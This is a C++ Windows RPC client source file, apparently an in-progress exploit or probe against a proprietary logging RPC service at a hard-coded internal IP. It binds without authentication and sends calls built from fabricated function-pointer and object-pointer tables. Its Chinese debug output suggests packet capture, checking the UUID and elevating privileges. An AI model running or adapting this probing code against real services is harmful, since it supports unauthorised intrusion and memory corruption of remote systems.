#include <windows.h>
#include <stdio.h>
#include <rpc.h>
#include <rpcdce.h>
#include "../log.h"
#include "../rpcClient/LoggerDll.h"
#include "../rpcClient/LogClient.h"
#include "LogFlagEditor.h"

#pragma comment(lib, "rpcrt4.lib")


struct RpcParamReturn {
    unsigned short type;
    unsigned short offset;
    unsigned short value;
};

extern "C" void CopyUUID(const char* uuid);

void* __RPC_USER midl_user_allocate(size_t len) { return malloc(len); }

void __RPC_USER midl_user_free(void* ptr) { free(ptr); }

void Uuid2Binary(const char* uuid_str, unsigned char* binary_uuid) {
    for (int i = 0,j = 0; i < strlen(uuid_str); ) {
        if (uuid_str[i] == '-') {
            i++;
        }
        else if(isxdigit(uuid_str[i]) && isxdigit( uuid_str[i+1])) {
            char byte_str[3] = { uuid_str[i], uuid_str[++i], '\0' };
			binary_uuid[j++] = (unsigned char)strtoul(byte_str, NULL, 16);
            i += 2;
        }
        else {
            break;
        }
    }
}


void mytest1() {
	MessageBoxA(0, "Hello, World!", "Test1", MB_OK); 
}
void mytest2() {
    MessageBoxA(0, "Hello, World!", "Test2", MB_OK);
}


int main(int argc, wchar_t* argv[]) {

    LogFlagEditor();

    LogClient();

    LoggerDll();

    RPC_STATUS status;
    handle_t binding_handle = NULL;
    RPC_WSTR string_binding = NULL;

    const wchar_t* SERVER_IP = L"10.43.201.172";

    unsigned char str_uuid2[16] = {
    0x8C, 0x9E, 0x28, 0x85, 0x62, 0xF2, 0x97, 0x47, 0x84, 0xDF, 0x3E, 0x4B, 0xA6, 0x0E, 0xFE, 0x8B
    };
    const char str_uuid1 [] = {
    0x4B, 0x97, 0x81, 0x19, 0xF7, 0x6B, 0xCB, 0x46, 0x96, 0x40, 0x02, 0x60, 0xBB, 0xB5, 0x51, 0xBA
    };

    unsigned char str_uuid[16] = {
    0x9D, 0x8E, 0xDD, 0x2C, 0x83, 0x71, 0x00, 0x49, 0xA8, 0x18, 0x6A, 0x75, 0xB3, 0xEE, 0xC6, 0xF6
    };

    //off_44E400
    //const wchar_t *wtring_uuid_client = L"57810394-0D55-4E58-A04C-D71AB05575D6";
    //UuidToStringW((UUID*)str_uuid, (RPC_WSTR*)&wtring_uuid);
    //stru_44E210
	const wchar_t* wtring_uuid = L"2cdd8e9d-7183-4900-a818-6a75b3eec6f6";


    //const wchar_t* wtring_uuid = L"85289e8c-f262-4797-84df-3e4ba60efe8b";


    //const wchar_t* wtring_uuid = L"253DAC9E-E710-4929-A1CC-76AF096DB154";

    //const wchar_t* wtring_uuid = L"C72A0EF5-DF23-EC47-858B-20C9EEFDBF61";
    
    //const wchar_t* wtring_uuid = L"079DBB7A-51ED-D14B-BEEE-3F7337F7E1E8";
    //const wchar_t* wtring_uuid_client = L"C26936EA-DE3B-C14C-B34A-77708CE6B37C" ;

	UUID binary_uuid;

    UuidFromStringW((RPC_WSTR)wtring_uuid, &binary_uuid);

    //CopyUUID((char*)&binary_uuid);

    status = RpcStringBindingComposeW(
        (RPC_WSTR)wtring_uuid,
        (RPC_WSTR)L"ncacn_ip_tcp",
        (RPC_WSTR)SERVER_IP,
        (RPC_WSTR)L"135",      //54894
        NULL,
        &string_binding
    );
    if (status != RPC_S_OK) {
        printf("[!] RpcStringBindingComposeW error: 0x%lx\n", status);
        return -1;
    }

    printf("[*] 生成绑定字符串 (无 UUID): %ws\n", string_binding);

    status = RpcBindingFromStringBindingW(string_binding, &binding_handle); 
    if (status != RPC_S_OK) {
        printf("[!] RpcBindingFromStringBindingW 失败: 0x%lx\n", status);
        return 1;
    }

    status= RpcBindingSetObject(binding_handle, &binary_uuid);
    if (status != RPC_S_OK) {
        printf("[!] RpcBindingSetObject 失败: 0x%lx\n", status);
        return 1;
    }

    //RpcStringFreeW(&string_binding);
    
    RPC_WSTR current_string_binding = NULL;
    status = RpcBindingToStringBindingW(binding_handle, &current_string_binding);
    if (status == RPC_S_OK) {
        printf("[*] 当前绑定字符串: %ws\n", current_string_binding);
        RpcStringFreeW(&current_string_binding);
    }
    
    
    status = RpcBindingSetAuthInfoExW(
        binding_handle,
        NULL,
        RPC_C_AUTHN_LEVEL_NONE,
        RPC_C_AUTHN_WINNT,
        NULL,
        RPC_C_QOS_CAPABILITIES_MUTUAL_AUTH,
        NULL
    );
    if (status != RPC_S_OK) {
        printf("[!] 设置认证信息警告: 0x%lx (尝试继续)\n", status);
    }

    __try {
        DWORD funcs[256] = { 0 };
        funcs[0] = (DWORD)0xe7a463;
        funcs[1] = (DWORD)0xe7a463;
        funcs[2] = (DWORD)0xe7a463;
        funcs[3] = (DWORD)0xe7a463;

        DWORD func_ptr[256] = { 0 };
        func_ptr[0] = (DWORD)funcs[0];
        func_ptr[1] = (DWORD)funcs[1];
        func_ptr[2] = (DWORD)funcs[2];
        func_ptr[3] = (DWORD)funcs[3];

        func_ptr[0] = (DWORD)0;
        func_ptr[1] = (DWORD)0;
        func_ptr[2] = (DWORD)0;
        func_ptr[3] = (DWORD)0;

        DWORD this_ptr[256] = { 0 };
        this_ptr[0] = (DWORD)&func_ptr[0];
        this_ptr[1] = (DWORD)&func_ptr[1];
        this_ptr[2] = (DWORD)&func_ptr[2];
        this_ptr[3] = (DWORD)&func_ptr[3];

        DWORD param[256];
        param[0] = (DWORD)binding_handle;
        param[1] = (DWORD)(&this_ptr[1]);
        
        LogFunction0(param);

        DWORD buf[256] = { 0 };
        buf[0] = (int)4;
        buf[1] = 0;
        buf[2] =4;
        buf[3] = 0;

        DWORD lpptr = (DWORD)( this_ptr[1]);

        //this_ptr[1] = (DWORD)  funcs[1];
        
		param[0] = (DWORD)lpptr;
        param[1] = (DWORD)buf[0];
        param[2] = (DWORD)buf[1];
        param[3] = (DWORD)buf[2];
        param[4] = (DWORD)buf[3];
        param[5] = (DWORD)&buf[16];
        LogFunction1((char*)param, (int*)this_ptr);


        //param[0] = (DWORD)lpptr;
        //param[1] = (DWORD)0x10;
        //LogFunction2((int*)param, (int*)this_ptr);
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        DWORD code = GetExceptionCode();
        printf("\n[!!!] 捕获异常: 0x%08lx\n", code);

        if (code == RPC_S_INTERFACE_NOT_FOUND) { // 0x6A6
            printf("[-] 依然是 0x6A6。\n");
            printf("[-] 诊断：服务端完全拒绝该接口，或标准 RPC 库无法满足其握手要求。\n");
            printf("[-] 建议：\n");
            printf("    1. 使用 Wireshark 抓包，查看 64862 端口的交互细节。\n");
            printf("    2. 确认 UUID 是否正确 (是否应该是全 0 或其他值)。\n");
            printf("    3. 如果服务端是私有协议，可能需要用 Winsock (send/recv) 手写客户端。\n");
        }
        else if (code == RPC_S_SERVER_UNAVAILABLE) {
            printf("[-] 服务器不可用 (0x6BA)。端口不通或服务端崩溃。\n");
        }
        else if (code == RPC_S_ACCESS_DENIED) {
            printf("[-] 访问被拒绝 (0x5)。尝试提升权限或更改认证级别。\n");
        }

        LPVOID msgBuf;
        FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
            NULL, code, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
            (LPTSTR)&msgBuf, 0, NULL);
        if (msgBuf) {
            printf("详情: %s\n", (char*)msgBuf);
            LocalFree(msgBuf);
        }
    }

    RpcBindingFree(&binding_handle);
    return 0;
}